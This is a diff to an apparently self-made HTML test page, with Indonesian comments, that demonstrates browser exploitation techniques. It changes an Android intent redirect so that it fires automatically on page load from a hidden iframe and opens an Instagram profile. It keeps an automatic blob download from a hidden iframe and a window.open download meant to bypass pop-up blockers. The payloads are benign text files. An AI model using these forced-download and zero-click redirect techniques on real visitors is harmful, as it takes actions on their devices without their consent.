@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>File Handling & Intent Redirection Exploit</title>
+<title>Zero-Click Instagram Intent via Iframe</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
@@ -20,8 +20,8 @@ button:disabled { background: #555; }
 
 <body>
 <div class="panel" id="main-panel">
-    <h1>File Handling & Intent Redirection</h1>
-    <p>Menguji eksploitasi unduhan otomatis dan pengalihan Intent melalui Iframe dan Window Open.</p>
+    <h1>Zero-Click Intent via Iframe</h1>
+    <p>Membuka profil Instagram Anda secara otomatis (Zero-Click) menggunakan Iframe saat halaman dimuat.</p>
     
     <button id="btn-auto-download" type="button">1. Auto Download via Iframe</button>
     <button id="btn-intent-redirect" type="button">2. Intent Redirect via Iframe</button>
@@ -48,7 +48,6 @@ button:disabled { background: #555; }
         const iframe = document.createElement('iframe');
         iframe.style.display = 'none';
         
-        // Suntikkan HTML yang memicu unduhan otomatis
         const iframeDoc = iframe.contentWindow.document;
         iframeDoc.open();
         iframeDoc.write(`
@@ -56,7 +55,6 @@ button:disabled { background: #555; }
             <html>
             <body>
                 <script>
-                    // Blob Download Otomatis dari dalam Iframe
                     const blob = new Blob(['Hacked by Iframe'], {type: 'text/plain'});
                     const url = URL.createObjectURL(blob);
                     const a = document.createElement('a');
@@ -77,10 +75,11 @@ button:disabled { background: #555; }
         log("Iframe dimuat dan memicu unduhan.");
     });
 
-    // 2. Intent Redirect via Iframe (Android)
-    document.getElementById("btn-intent-redirect").addEventListener("click", () => {
-        statusDiv.textContent = "Memicu Intent Redirect via Iframe...";
-        log("Membuat Iframe Intent...");
+    // 2. Intent Redirect via Iframe (Android) - DIUBAH MENJADI ZERO CLICK
+    // Fungsi ini dipanggil otomatis saat halaman dimuat
+    function triggerZeroClickIntent() {
+        statusDiv.textContent = "Zero-Click Intent berjalan di latar belakang...";
+        log("Membuat Iframe Intent tersembunyi...");
 
         const iframe = document.createElement('iframe');
         iframe.style.display = 'none';
@@ -92,7 +91,7 @@ button:disabled { background: #555; }
             <html>
             <body>
                 <script>
-                    // Mencoba membuka Intent dari dalam Iframe
+                    // Intent ke profil Instagram (Ganti theonly_w4gur1 dengan username Anda)
                     window.location.href = 'intent://instagram.com/_u/theonly_w4gur1/#Intent;scheme=https;package=com.instagram.android;category=android.intent.category.BROWSABLE;end';
                 <\/script>
             </body>
@@ -102,10 +101,17 @@ button:disabled { background: #555; }
         
         document.body.appendChild(iframe);
         
-        statusDiv.textContent = "Iframe Intent dipicu.";
-        statusDiv.style.color = "#4CAF50";
-        log("Iframe Intent dimuat.");
+        log("Iframe Intent dikirim ke sistem Android.");
+    }
+
+    // Panggil fungsi Zero-Click saat DOM siap
+    window.addEventListener("DOMContentLoaded", () => {
+        // Jeda sedikit agar halaman utama sempat dirender
+        setTimeout(triggerZeroClickIntent, 500);
     });
+
+    // Tombol manual (opsional, jika Zero-Click diblokir)
+    document.getElementById("btn-intent-redirect").addEventListener("click", triggerZeroClickIntent);
 
     // 3. Window Open Blob Download (Bypass Pop-up Blocker)
     document.getElementById("btn-window-open").addEventListener("click", () => {
@@ -115,7 +121,6 @@ button:disabled { background: #555; }
         const blob = new Blob(['Hacked by Window Open'], {type: 'text/plain'});
         const url = URL.createObjectURL(blob);
         
-        // Membuka URL Blob langsung di tab baru
         const win = window.open(url, '_blank');
         
         if (win) {
